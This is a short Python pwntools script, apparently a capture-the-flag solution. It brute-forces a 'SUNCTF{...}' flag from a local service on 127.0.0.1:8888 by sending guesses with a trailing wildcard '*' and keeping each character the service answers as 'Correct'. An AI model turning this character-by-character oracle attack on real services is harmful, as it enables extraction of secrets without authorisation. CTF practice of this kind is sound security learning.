from pwn import *
import string
alphas = list(string.ascii_letters + string.digits + "}" + "_")
flag = "SUNCTF{"

while True:
    for x in alphas:

        io = remote('127.0.0.1', 8888) 

        received = io.recvuntil(b'If you guess the flag correctly, we will let you know!: ')
        io.sendline(flag + x + "*")

        returned = io.recv() 
        if "Correct" in str(returned):
            flag += x
            print(flag)
            

        io.close()
        if "}" in flag:
            print(flag)
            exit()
        sleep(0.1)



